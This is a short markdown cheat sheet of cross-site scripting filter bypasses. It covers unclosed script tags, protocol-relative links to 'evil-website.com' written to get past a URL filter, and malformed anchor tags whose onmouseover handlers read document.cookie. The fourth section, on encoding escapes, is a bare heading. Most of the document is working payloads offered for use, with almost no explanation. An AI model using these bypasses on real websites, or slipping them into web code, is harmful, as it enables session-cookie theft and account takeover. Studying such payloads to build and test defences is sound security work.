## 1. Self Closing HTML Tags

`<script>alert()` //Actual Code

- Browser Fixed code
```js
<script>alert()</script>
```


## 2. Protocol Relative URLs

#### Two example PRURL links can be seen next:
```html
<a href="https://evil-website.com">click</a> <!-- filtered -->
```
Bypass
```html
<a href="//evil-website.com">click</a> <!-- not filtered -->
```


## 3. Malformed Tags

Browser can correct malformed HTML Tags 
`<a>` Tag is such tag where most browser will attempt to correct.

#### The following tags are such invalid tag that Chrome will restore to full capabilities.

```html
\<a onmouseover="alert(document.cookie)"\>xxs\</a\>
\<a onmouseover=alert(document.cookie)\>xxs\</a\>
```

## 4. Encoding Escape





